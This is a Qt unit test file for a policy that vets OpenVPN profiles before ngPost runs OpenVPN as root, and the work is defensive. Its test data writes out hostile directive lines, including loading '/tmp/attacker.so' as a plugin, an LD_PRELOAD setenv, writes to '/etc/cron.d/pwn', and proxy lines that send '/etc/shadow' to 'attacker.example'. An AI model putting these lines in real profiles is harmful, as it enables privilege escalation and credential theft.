// Copyright (C) 2026 Hydro74000 <acymap@gmail.com>
//========================================================================
//
// tst_OpenVpnConfigPolicy.cpp — what a .ovpn profile may ask of an OpenVPN
// process ngPost starts with system privileges.
//
// The profile was the way through the Linux privilege boundary: the Polkit
// rule lets the configured user reach the helper without a password, the
// helper runs OpenVPN as root, and OpenVPN's `plugin` directive loads a
// shared library into that process. `--script-security 0` does not stop it;
// scripts and plugins are separate mechanisms. Any process running as the
// user could write such a profile.
//
//========================================================================

#include <QtTest>
#include <QFile>
#include <QRegularExpression>
#include <QTemporaryDir>

#include "vpn/OpenVpnConfigPolicy.h"

using OpenVpnConfigPolicy::Outcome;
using OpenVpnConfigPolicy::Verdict;

namespace
{
//! The four lists the privileged helper carries, read back out of the script.
//! They are a second implementation of the same policy -- the helper must not
//! trust the ngPost that invoked it -- and the two drifting apart is exactly
//! the kind of thing nobody notices until a directive is refused on one side
//! and accepted on the other.
QStringList helperList(QString const &variable, bool *ok)
{
    *ok = false;
    QFile script(QStringLiteral(NGPOST_SOURCE_ROOT "/src/vpn/scripts/ngpost-vpn-helper.sh"));
    if (!script.open(QIODevice::ReadOnly | QIODevice::Text))
        return {};

    QString const  text  = QString::fromUtf8(script.readAll());
    QString const  start = variable + QStringLiteral("=\"");
    int const      from  = text.indexOf(start);
    if (from < 0)
        return {};
    int const contentStart = from + start.size();
    int const end          = text.indexOf(QLatin1Char('"'), contentStart);
    if (end < 0)
        return {};

    QStringList list = text.mid(contentStart, end - contentStart)
                               .split(QRegularExpression(QStringLiteral("\\s+")),
                                      Qt::SkipEmptyParts);
    list.removeDuplicates();
    list.sort();
    *ok = true;
    return list;
}

QByteArray profile(QStringList const &lines)
{
    return (lines.join(QLatin1Char('\n')) + QLatin1Char('\n')).toUtf8();
}

//! A profile a real provider would ship: everything inline, nothing exotic.
QStringList realisticProfile()
{
    return { QStringLiteral("client"),
             QStringLiteral("dev tun"),
             QStringLiteral("proto udp"),
             QStringLiteral("remote vpn.example.com 1194"),
             QStringLiteral("resolv-retry infinite"),
             QStringLiteral("nobind"),
             QStringLiteral("persist-key"),
             QStringLiteral("persist-tun"),
             QStringLiteral("remote-cert-tls server"),
             QStringLiteral("auth-user-pass"),
             QStringLiteral("cipher AES-256-GCM"),
             QStringLiteral("verb 3"),
             QStringLiteral("<ca>"),
             QStringLiteral("-----BEGIN CERTIFICATE-----"),
             QStringLiteral("MIIBmTCCAUOgAwIBAgIJAK"),
             QStringLiteral("-----END CERTIFICATE-----"),
             QStringLiteral("</ca>"),
             QStringLiteral("<tls-crypt>"),
             QStringLiteral("-----BEGIN OpenVPN Static key V1-----"),
             QStringLiteral("6acef03f62675b4b1bbd03e53b187727"),
             QStringLiteral("-----END OpenVPN Static key V1-----"),
             QStringLiteral("</tls-crypt>") };
}
}

class TestOpenVpnConfigPolicy : public QObject
{
    Q_OBJECT

private slots:
    //! The one the audit asks for by name: a profile carrying `plugin` is
    //! refused, and it stays refused when it also sets script-security 0 --
    //! that option governs scripts, never the plugin loader.
    void plugin_is_refused_even_with_script_security_zero();

    //! Every directive whose whole purpose is to run code, read a path or
    //! write one from the root process.
    void dangerous_directives_are_refused_data();
    void dangerous_directives_are_refused();

    //! The whitelist is the rule, so an option nobody reviewed is refused
    //! rather than passed through to a process running as root.
    void unreviewed_directive_is_refused();

    //! A profile a provider would actually ship still imports.
    void realistic_profile_is_accepted();

    //! ...and comes back with its comments dropped and its directives kept.
    void accepted_profile_is_regenerated_without_comments();

    //! Reading a file as root is a primitive of its own, so a path is refused
    //! where a plain sibling name is not.
    void file_bearing_directives_reject_paths_data();
    void file_bearing_directives_reject_paths();

    //! ngPost writes the credential file itself and names it on the command
    //! line; a profile naming one would make root read that instead.
    void auth_user_pass_is_bare_only();

    //! OpenVPN's proxy directives take an authentication FILE positionally and
    //! then send its content to the proxy the profile itself named: the root
    //! read and the way off the machine in the same line.
    void proxy_directives_reject_a_credentials_file_data();
    void proxy_directives_reject_a_credentials_file();

    //! --route-nopull governs what the SERVER pushes; a route written in the
    //! profile is applied regardless, so the profile could hand the root
    //! process this machine's routing table. They are dropped from the
    //! generated configuration rather than refusing the whole profile, which
    //! would reject very nearly every provider .ovpn over a directive that
    //! ends up doing nothing.
    void routing_directives_are_dropped_data();
    void routing_directives_are_dropped();

    //! ...and dropping them must not become a way to smuggle one through.
    void a_dropped_directive_never_reaches_the_generated_config();

    //! A connection block holds directives, so it is validated, not skipped.
    void connection_block_is_validated();

    //! An inline block left open would otherwise swallow the rest of the file.
    void unterminated_inline_block_is_refused();

    //! Binary and oversized input are refused before anything parses them.
    void malformed_input_is_refused();

    //! A message quotes the profile back, and the profile can be any file the
    //! caller named -- so what it quotes is reduced to a safe label.
    void reported_directive_is_reduced_to_a_safe_label();

    //! The privileged helper carries its own copy of these lists. They must
    //! stay identical, directive for directive.
    void helper_script_lists_match_data();
    void helper_script_lists_match();
};

void TestOpenVpnConfigPolicy::plugin_is_refused_even_with_script_security_zero()
{
    Verdict const v = OpenVpnConfigPolicy::inspect(profile({
        QStringLiteral("client"),
        QStringLiteral("dev tun"),
        QStringLiteral("remote vpn.example.com 1194"),
        QStringLiteral("script-security 0"),
        QStringLiteral("plugin /tmp/attacker.so"),
    }));

    // script-security is itself refused, and it comes first: what matters is
    // that the profile as a whole never reaches root.
    QVERIFY(!v.isAccepted());
    QCOMPARE(v.outcome, Outcome::DangerousDirective);

    // Now with only the plugin, so the verdict names it.
    Verdict const p = OpenVpnConfigPolicy::inspect(profile({
        QStringLiteral("client"),
        QStringLiteral("dev tun"),
        QStringLiteral("plugin /tmp/attacker.so"),
    }));
    QVERIFY(!p.isAccepted());
    QCOMPARE(p.outcome, Outcome::DangerousDirective);
    QCOMPARE(p.directive, QStringLiteral("plugin"));
    QCOMPARE(p.lineNumber, 3);
    QVERIFY(p.sanitizedConfig.isEmpty());

    // And spelled the way it would be on a command line.
    Verdict const d = OpenVpnConfigPolicy::inspect(profile({
        QStringLiteral("client"),
        QStringLiteral("--plugin /tmp/attacker.so"),
    }));
    QCOMPARE(d.outcome, Outcome::DangerousDirective);
    QCOMPARE(d.directive, QStringLiteral("plugin"));
}

void TestOpenVpnConfigPolicy::dangerous_directives_are_refused_data()
{
    QTest::addColumn<QString>("line");

    QTest::newRow("plugin")            << QStringLiteral("plugin /tmp/x.so");
    QTest::newRow("pkcs11-providers")  << QStringLiteral("pkcs11-providers /tmp/x.so");
    QTest::newRow("providers")         << QStringLiteral("providers legacy");
    QTest::newRow("engine")            << QStringLiteral("engine dynamic");
    QTest::newRow("script-security")   << QStringLiteral("script-security 2");
    QTest::newRow("up")                << QStringLiteral("up /tmp/x.sh");
    QTest::newRow("down")              << QStringLiteral("down /tmp/x.sh");
    QTest::newRow("route-up")          << QStringLiteral("route-up /tmp/x.sh");
    QTest::newRow("ipchange")          << QStringLiteral("ipchange /tmp/x.sh");
    QTest::newRow("tls-verify")        << QStringLiteral("tls-verify /tmp/x.sh");
    QTest::newRow("learn-address")     << QStringLiteral("learn-address /tmp/x.sh");
    QTest::newRow("client-connect")    << QStringLiteral("client-connect /tmp/x.sh");
    QTest::newRow("auth-user-pass-verify")
            << QStringLiteral("auth-user-pass-verify /tmp/x.sh via-env");
    QTest::newRow("config")            << QStringLiteral("config /etc/openvpn/other.conf");
    QTest::newRow("setenv")            << QStringLiteral("setenv LD_PRELOAD /tmp/x.so");
    QTest::newRow("log")               << QStringLiteral("log /etc/cron.d/pwn");
    QTest::newRow("status")            << QStringLiteral("status /etc/cron.d/pwn");
    QTest::newRow("writepid")          << QStringLiteral("writepid /etc/cron.d/pwn");
    QTest::newRow("tmp-dir")           << QStringLiteral("tmp-dir /etc");
    QTest::newRow("askpass")           << QStringLiteral("askpass /root/.ssh/id_rsa");
    QTest::newRow("http-proxy-user-pass")
            << QStringLiteral("http-proxy-user-pass proxy.auth");
    QTest::newRow("iproute")           << QStringLiteral("iproute /tmp/fake-ip");
    QTest::newRow("dev-node")          << QStringLiteral("dev-node /dev/mem");
    QTest::newRow("daemon")            << QStringLiteral("daemon");
    QTest::newRow("chroot")            << QStringLiteral("chroot /tmp");
    QTest::newRow("user")              << QStringLiteral("user root");
    QTest::newRow("cd")                << QStringLiteral("cd /root");
    QTest::newRow("management")        << QStringLiteral("management 127.0.0.1 9999");
}

void TestOpenVpnConfigPolicy::dangerous_directives_are_refused()
{
    QFETCH(QString, line);

    Verdict const v = OpenVpnConfigPolicy::inspect(
            profile({ QStringLiteral("client"), QStringLiteral("dev tun"), line }));

    QVERIFY2(!v.isAccepted(), qPrintable(line));
    QCOMPARE(v.outcome, Outcome::DangerousDirective);
    QCOMPARE(v.lineNumber, 3);
    QVERIFY2(!v.reason.isEmpty(), qPrintable(line));
    QVERIFY(v.sanitizedConfig.isEmpty());
}

void TestOpenVpnConfigPolicy::unreviewed_directive_is_refused()
{
    Verdict const v = OpenVpnConfigPolicy::inspect(profile({
        QStringLiteral("client"),
        QStringLiteral("an-option-openvpn-grew-after-this-list 1"),
    }));

    QCOMPARE(v.outcome, Outcome::UnknownDirective);
    QCOMPARE(v.lineNumber, 2);
}

void TestOpenVpnConfigPolicy::realistic_profile_is_accepted()
{
    Verdict const v = OpenVpnConfigPolicy::inspect(profile(realisticProfile()));

    QVERIFY2(v.isAccepted(),
             qPrintable(QStringLiteral("line %1: %2 (%3)")
                                .arg(v.lineNumber)
                                .arg(v.reason, v.directive)));
    QVERIFY(v.sanitizedConfig.contains("remote vpn.example.com 1194"));
    QVERIFY(v.sanitizedConfig.contains("-----BEGIN CERTIFICATE-----"));
    QVERIFY(v.sanitizedConfig.contains("</tls-crypt>"));
}

void TestOpenVpnConfigPolicy::accepted_profile_is_regenerated_without_comments()
{
    Verdict const v = OpenVpnConfigPolicy::inspect(profile({
        QStringLiteral("# a comment"),
        QStringLiteral("; another one"),
        QString(),
        QStringLiteral("client"),
        QStringLiteral("dev tun"),
    }));

    QVERIFY(v.isAccepted());
    QCOMPARE(v.sanitizedConfig, QByteArray("client\ndev tun\n"));
}

void TestOpenVpnConfigPolicy::file_bearing_directives_reject_paths_data()
{
    QTest::addColumn<QString>("line");
    QTest::addColumn<bool>("accepted");

    QTest::newRow("ca sibling")       << QStringLiteral("ca ca.crt")            << true;
    QTest::newRow("cert sibling")     << QStringLiteral("cert client.crt")      << true;
    QTest::newRow("key sibling")      << QStringLiteral("key client.key")       << true;
    QTest::newRow("tls-auth sibling") << QStringLiteral("tls-auth ta.key 1")    << true;
    QTest::newRow("ca absolute")      << QStringLiteral("ca /etc/shadow")       << false;
    QTest::newRow("ca traversal")     << QStringLiteral("ca ../../etc/shadow")  << false;
    QTest::newRow("ca subdir")        << QStringLiteral("ca keys/ca.crt")       << false;
    QTest::newRow("ca dot")           << QStringLiteral("ca ..")                << false;
    QTest::newRow("ca windows path")  << QStringLiteral("ca C:\\\\Windows\\\\x") << false;
    QTest::newRow("ca no argument")   << QStringLiteral("ca")                   << false;
    QTest::newRow("key absolute")     << QStringLiteral("key /root/.ssh/id_rsa") << false;
}

void TestOpenVpnConfigPolicy::file_bearing_directives_reject_paths()
{
    QFETCH(QString, line);
    QFETCH(bool, accepted);

    Verdict const v = OpenVpnConfigPolicy::inspect(
            profile({ QStringLiteral("client"), QStringLiteral("dev tun"), line }));

    QCOMPARE(v.isAccepted(), accepted);
    if (!accepted)
        QCOMPARE(v.outcome, Outcome::UnsafeArgument);
}

void TestOpenVpnConfigPolicy::auth_user_pass_is_bare_only()
{
    Verdict const bare = OpenVpnConfigPolicy::inspect(
            profile({ QStringLiteral("client"), QStringLiteral("auth-user-pass") }));
    QVERIFY(bare.isAccepted());

    Verdict const withPath = OpenVpnConfigPolicy::inspect(
            profile({ QStringLiteral("client"), QStringLiteral("auth-user-pass /etc/shadow") }));
    QCOMPARE(withPath.outcome, Outcome::UnsafeArgument);
    QCOMPARE(withPath.directive, QStringLiteral("auth-user-pass"));
}

void TestOpenVpnConfigPolicy::proxy_directives_reject_a_credentials_file_data()
{
    QTest::addColumn<QString>("line");
    QTest::addColumn<bool>("accepted");

    QTest::newRow("http host+port")   << QStringLiteral("http-proxy proxy.example 8080")   << true;
    QTest::newRow("http auto")        << QStringLiteral("http-proxy proxy.example 8080 auto")
                                      << true;
    QTest::newRow("http auto-nct")    << QStringLiteral("http-proxy proxy.example 8080 auto-nct")
                                      << true;
    QTest::newRow("http auto basic")  << QStringLiteral("http-proxy proxy.example 8080 auto basic")
                                      << true;
    QTest::newRow("socks host+port")  << QStringLiteral("socks-proxy proxy.example 1080")  << true;

    QTest::newRow("http authfile")
            << QStringLiteral("http-proxy attacker.example 8080 /etc/shadow basic") << false;
    QTest::newRow("http sibling authfile")
            << QStringLiteral("http-proxy attacker.example 8080 proxy.auth basic")   << false;
    QTest::newRow("http stdin")
            << QStringLiteral("http-proxy attacker.example 8080 stdin basic")        << false;
    QTest::newRow("http bad method")
            << QStringLiteral("http-proxy proxy.example 8080 auto /etc/shadow")      << false;
    QTest::newRow("http too many")
            << QStringLiteral("http-proxy p 8080 auto basic extra")                  << false;
    QTest::newRow("http no port")     << QStringLiteral("http-proxy proxy.example")  << false;
    QTest::newRow("socks authfile")
            << QStringLiteral("socks-proxy attacker.example 1080 /etc/shadow")       << false;
}

void TestOpenVpnConfigPolicy::proxy_directives_reject_a_credentials_file()
{
    QFETCH(QString, line);
    QFETCH(bool, accepted);

    Verdict const v = OpenVpnConfigPolicy::inspect(
            profile({ QStringLiteral("client"), QStringLiteral("dev tun"), line }));

    QCOMPARE(v.isAccepted(), accepted);
    if (!accepted)
        QCOMPARE(v.outcome, Outcome::UnsafeArgument);
}

void TestOpenVpnConfigPolicy::routing_directives_are_dropped_data()
{
    QTest::addColumn<QString>("line");

    QTest::newRow("route")             << QStringLiteral("route 10.0.0.0 255.0.0.0");
    QTest::newRow("route default")     << QStringLiteral("route 0.0.0.0 0.0.0.0 10.8.0.1");
    QTest::newRow("redirect-gateway")  << QStringLiteral("redirect-gateway def1");
    QTest::newRow("redirect-private")  << QStringLiteral("redirect-private");
    QTest::newRow("route-delay")       << QStringLiteral("route-delay 5");
    QTest::newRow("route-metric")      << QStringLiteral("route-metric 100");
}

void TestOpenVpnConfigPolicy::routing_directives_are_dropped()
{
    QFETCH(QString, line);

    Verdict const v = OpenVpnConfigPolicy::inspect(
            profile({ QStringLiteral("client"), QStringLiteral("dev tun"), line }));

    // The profile imports...
    QVERIFY2(v.isAccepted(), qPrintable(QStringLiteral("%1: %2").arg(line, v.reason)));
    // ...and the directive is not in what OpenVPN will be handed.
    QVERIFY2(!v.sanitizedConfig.contains(line.section(QLatin1Char(' '), 0, 0).toUtf8()),
             qPrintable(QString::fromUtf8(v.sanitizedConfig)));
}

void TestOpenVpnConfigPolicy::a_dropped_directive_never_reaches_the_generated_config()
{
    Verdict const v = OpenVpnConfigPolicy::inspect(profile({
        QStringLiteral("client"),
        QStringLiteral("dev tun"),
        QStringLiteral("redirect-gateway def1 bypass-dhcp"),
        QStringLiteral("route 0.0.0.0 0.0.0.0 vpn_gateway"),
        QStringLiteral("remote vpn.example.com 1194"),
    }));

    QVERIFY(v.isAccepted());
    QCOMPARE(v.sanitizedConfig,
             QByteArray("client\ndev tun\nremote vpn.example.com 1194\n"));
}

void TestOpenVpnConfigPolicy::connection_block_is_validated()
{
    Verdict const good = OpenVpnConfigPolicy::inspect(profile({
        QStringLiteral("client"),
        QStringLiteral("<connection>"),
        QStringLiteral("remote 198.51.100.1 1194 udp"),
        QStringLiteral("</connection>"),
    }));
    QVERIFY2(good.isAccepted(), qPrintable(good.reason));

    Verdict const hidden = OpenVpnConfigPolicy::inspect(profile({
        QStringLiteral("client"),
        QStringLiteral("<connection>"),
        QStringLiteral("plugin /tmp/attacker.so"),
        QStringLiteral("</connection>"),
    }));
    QCOMPARE(hidden.outcome, Outcome::DangerousDirective);
    QCOMPARE(hidden.directive, QStringLiteral("plugin"));
}

void TestOpenVpnConfigPolicy::unterminated_inline_block_is_refused()
{
    Verdict const v = OpenVpnConfigPolicy::inspect(profile({
        QStringLiteral("client"),
        QStringLiteral("<ca>"),
        QStringLiteral("-----BEGIN CERTIFICATE-----"),
    }));

    QCOMPARE(v.outcome, Outcome::Malformed);
    QCOMPARE(v.directive, QStringLiteral("ca"));
}

void TestOpenVpnConfigPolicy::malformed_input_is_refused()
{
    QByteArray binary("client\ndev tun\n");
    binary.append('\0');
    binary.append("more");
    QCOMPARE(OpenVpnConfigPolicy::inspect(binary).outcome, Outcome::Malformed);

    QByteArray huge(OpenVpnConfigPolicy::kMaxConfigBytes + 1, 'a');
    QCOMPARE(OpenVpnConfigPolicy::inspect(huge).outcome, Outcome::Malformed);

    QCOMPARE(OpenVpnConfigPolicy::inspectFile(QStringLiteral("/nonexistent/nope.ovpn")).outcome,
             Outcome::Malformed);
}

void TestOpenVpnConfigPolicy::reported_directive_is_reduced_to_a_safe_label()
{
    // The "profile" may be any file the caller named -- ngPost opens it as the
    // user, the helper as root -- so a line of it must never come back verbatim.
    Verdict const v = OpenVpnConfigPolicy::inspect(
            QByteArray("client\nroot:$6$saltysalt$hash:19000:0:99999:7:::\n"));

    QVERIFY(!v.isAccepted());
    QVERIFY2(!v.directive.contains(QLatin1Char('$')), qPrintable(v.directive));
    QVERIFY2(!v.directive.contains(QLatin1Char(':')), qPrintable(v.directive));
    QVERIFY(v.directive.size() <= 32);
}

void TestOpenVpnConfigPolicy::helper_script_lists_match_data()
{
    QTest::addColumn<QString>("variable");
    QTest::addColumn<QStringList>("expected");

    // The helper keeps the plain directives and the file-bearing ones in two
    // variables; allowedDirectives() is their union, so subtract to compare.
    QStringList plain = OpenVpnConfigPolicy::allowedDirectives();
    for (QString const &fileBearing : OpenVpnConfigPolicy::fileBearingDirectives())
        plain.removeAll(fileBearing);

    QTest::newRow("allowed") << QStringLiteral("OPENVPN_ALLOWED_DIRECTIVES") << plain;
    QTest::newRow("file-bearing") << QStringLiteral("OPENVPN_FILE_BEARING_DIRECTIVES")
                                  << OpenVpnConfigPolicy::fileBearingDirectives();
    QTest::newRow("inline blocks") << QStringLiteral("OPENVPN_INLINE_BLOB_TAGS")
                                   << OpenVpnConfigPolicy::inlineBlockTags();
    QTest::newRow("dropped") << QStringLiteral("OPENVPN_DROPPED_DIRECTIVES")
                             << OpenVpnConfigPolicy::droppedDirectives();
    QTest::newRow("denied") << QStringLiteral("OPENVPN_DENIED_DIRECTIVES")
                            << OpenVpnConfigPolicy::deniedDirectives();
}

void TestOpenVpnConfigPolicy::helper_script_lists_match()
{
    QFETCH(QString, variable);
    QFETCH(QStringList, expected);

    bool              ok   = false;
    QStringList const fromHelper = helperList(variable, &ok);
    QVERIFY2(ok, qPrintable(QStringLiteral("could not read %1 out of the helper script").arg(variable)));

    QStringList wanted = expected;
    wanted.removeDuplicates();
    wanted.sort();

    QCOMPARE(fromHelper, wanted);
}

QTEST_MAIN(TestOpenVpnConfigPolicy)
#include "tst_OpenVpnConfigPolicy.moc"
